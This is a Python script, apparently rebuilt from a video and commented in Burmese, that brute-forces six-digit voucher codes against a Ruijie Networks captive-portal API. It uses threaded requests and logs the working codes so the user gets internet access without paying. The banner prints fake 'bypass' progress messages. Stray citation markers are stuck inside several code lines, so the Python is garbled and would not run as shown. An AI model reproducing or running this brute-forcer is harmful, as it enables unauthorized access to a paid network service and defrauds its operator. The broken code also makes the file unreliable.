import requests
import random
import string
import time
import os
from concurrent.futures import ThreadPoolExecutor

# [span_4](start_span)Video ထဲတွင် တွေ့ရသော စာသားများနှင့် အရောင်များ[span_4](end_span)
G = '\033[1;32m' # Green
R = '\033[1;31m' # Red
W = '\033[1;37m' # White
Y = '\033[1;33m' # Yellow

class StarlinkBrute:
    def __init__(self):
        [span_5](start_span)self.session_id = "example_session_id" # Portal မှ ရယူရန် လိုအပ်သည်[span_5](end_span)
        [span_6](start_span)self.url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"[span_6](end_span)

    def banner(self):
        os.system('clear')
        print(f"{G}[+] Checking Bypass...")
        print(f"{G}[+] Done.")
        print(f"{G}[+] Checking Internet Access...")
        print(f"{G}[+] Checking user key approval...")
        print(f"{G}[+] This action will take afew minute...")
        [span_7](start_span)[span_8](start_span)print(f"{W}[-]Trying to connect server...")[span_7](end_span)[span_8](end_span)
        time.sleep(2)

    def generate_code(self):
        # [span_9](start_span)Video ထဲတွင် ဂဏန်း ၆ လုံးသုံးထားသည်ကို တွေ့ရသည်[span_9](end_span)
        return ''.join(random.choice(string.digits) for _ in range(6))

    def test_voucher(self, code):
        data = {
            "voucher": code,
            "sessionId": self.session_id
        }
        try:
            # [span_10](start_span)Video ထဲကအတိုင်း Voucher စမ်းသပ်ခြင်း[span_10](end_span)
            res = requests.post(self.url, json=data, timeout=5)
            if "success" in res.text.lower():
                print(f"{G}Success Code: {code}")
                with open("success.txt", "a") as f:
                    f.write(code + "\n")
                return True
            else:
                # [span_11](start_span)Video ထဲတွင် အနီရောင်ဖြင့် ပြသသော Fail Code များ[span_11](end_span)
                print(f"{R}Fail Code: {code}")
                return False
        except:
            return False

    def menu(self):
        self.banner()
        print(f"\n{W}[1] Get Internet Access")
        print(f"[2] Brutefore Access Voucher Code")
        print(f"[3] Recheck Success Code")
        
        [span_12](start_span)[span_13](start_span)opt = input(f"\n{W}Enter an Option: ")[span_12](end_span)[span_13](end_span)
        
        if opt == "2":
            print(f"\n{W}GENERATED Code: 1000000")
            print(f"Already Check: 0")
            print(f"Remain Code: 1000000")
            print(f"Success codes and fail codes are saved in success.txt and fail.txt")
            [span_14](start_span)print(f"When program start it will not check from begin\n")[span_14](end_span)
            
            with ThreadPoolExecutor(max_workers=5) as executor:
                while True:
                    code = self.generate_code()
                    executor.submit(self.test_voucher, code)
                    time.sleep(0.05) # Video ထဲကအတိုင်း အမြန်နှုန်းအတွက်

if __name__ == "__main__":
    app = StarlinkBrute()
    app.menu()
